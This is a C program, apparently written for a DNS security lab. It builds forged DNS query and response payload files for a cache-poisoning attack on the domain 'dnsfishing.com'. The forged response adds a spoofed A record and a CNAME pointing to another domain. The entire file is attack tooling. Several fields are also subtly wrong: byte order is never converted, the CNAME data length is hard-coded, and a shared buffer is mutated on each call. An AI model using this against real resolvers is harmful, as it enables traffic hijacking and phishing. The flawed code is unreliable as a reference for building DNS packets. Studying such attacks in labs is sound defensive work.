// This piece of code is modified based on http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
//Header Files
#include<stdio.h>	//printf
#include<string.h>	//strlen
#include<stdlib.h>	//malloc
#include<unistd.h>	//getpid

//Types of DNS resource records :)

char attack_domain[] = "dnsfishing.com"; // target domain
char bad_domain[] = "www.ufl.edu";
char subdomain_host[50];

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//Function Prototypes
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
void forgeDNSQueryMessage(const char* filename);
void forgeDNSResponseMessage(const char* filename);
//DNS header structure
struct DNS_HEADER
{
	unsigned char tid1, tid2; // identification number
	unsigned short flags;

	unsigned short q_count; // number of question entries
	unsigned short ans_count; // number of answer entries
	unsigned short auth_count; // number of authority entries
	unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
	unsigned short qtype;
	unsigned short qclass;
};

//Constant sized fields of the resource record structure
struct R_DATA
{
	unsigned short type;
	unsigned short ans_class;
	unsigned int ttl;
	unsigned short data_len;
};

int main( int argc , char *argv[])
{
	int randomNumber = (rand()%10000000);
	while (randomNumber<1000000) 
		randomNumber*=10;
	sprintf(subdomain_host, ".x-%d.%s", randomNumber, attack_domain);
	
	forgeDNSQueryMessage("dns_query_payload");
	forgeDNSResponseMessage("dns_rsp_payload");
	return 0;
}

void forgeDNSQueryMessage(const char* filename){
	unsigned char buf[65536],*qname;
	size_t len = 0;
	//Set the DNS structure to standard queries
	struct DNS_HEADER *dns = (struct DNS_HEADER *)&buf;
	dns->tid1 = (unsigned char) (rand()%256);
	dns->tid2 = (unsigned char) (rand()%256);
	dns->flags = 0x0100; //This is a query
	dns->q_count = 1; //we have only 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = 0;
	len += 12;

	//point to the query portion
	qname =(unsigned char*)&buf[len];
	ChangetoDnsNameFormat(qname , subdomain_host);
	len += strlen((const char*)qname) + 1;

	struct QUESTION* qinfo =(struct QUESTION*)&buf[len]; //fill it
	qinfo->qtype = T_A; //type of the query , A , MX , CNAME , NS etc
	qinfo->qclass = 1; //its internet (lol)
	len += 4;

	// write query payload file
	FILE* fp = fopen(filename, "w");
	fwrite(buf, sizeof(char), len, fp);
	fclose(fp);
}

void forgeDNSResponseMessage(const char* filename){
	unsigned char buf[65536],*qname, *ipv4;
	size_t len = 0;
	struct DNS_HEADER *dns = NULL;
	struct R_DATA *ans = NULL;
	//Set the DNS structure to standard queries
	dns = (struct DNS_HEADER *)&buf;
	dns->tid1 = (unsigned char) (rand()%256);
	dns->tid2 = (unsigned char) (rand()%256);
	dns->flags = 0x8180;
	dns->q_count = 1; //we have only 1 question
	dns->ans_count = 2;
	dns->auth_count = 0;
	dns->add_count = 0;
	len += 12;

	//point to the query portion
	qname =(unsigned char*)&buf[len];
	ChangetoDnsNameFormat(qname , subdomain_host);
	len += strlen((const char*)qname) + 1;

	struct QUESTION* qinfo =(struct QUESTION*)&buf[len]; //fill it
	qinfo->qtype = T_A; //type of the query , A , MX , CNAME , NS etc
	qinfo->qclass = 1; //its internet (lol)
	len += 4;

	// write first response A
	qname =(unsigned char*)&buf[len];
	ChangetoDnsNameFormat(qname , subdomain_host);
	len += strlen((const char*)qname) + 1;
	
	ans = (struct R_DATA *)&buf[len];
	ans->type = T_A;
	ans->ans_class = 0x0001;
	ans->ttl = 0x0e10;
	ans->data_len = 4;
	len += 10;

	ipv4 =(unsigned char*)&buf[len];
	ipv4[0] = 10;
	ipv4[1] = 0;
	ipv4[2] = 2;
	ipv4[3] = 4;
	len += 4;

	//write second response
	qname =(unsigned char*)&buf[len];
	ChangetoDnsNameFormat(qname , attack_domain);
	len += strlen((const char*)qname) + 1;
	
	ans = (struct R_DATA *)&buf[len];
	ans->type = T_CNAME;
	ans->ans_class = 0x0001;
	ans->ttl = 0x0e10;
	ans->data_len = 4;
	len += 10;

	qname =(unsigned char*)&buf[len];
	ChangetoDnsNameFormat(qname , bad_domain);
	len += strlen((const char*)qname) + 1;

	// write query payload file
	FILE* fp = fopen(filename, "w");
	fwrite(buf, sizeof(char), len, fp);
	fclose(fp);
}
/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++; //or lock=i+1;
		}
	}
	*dns++='\0';
}
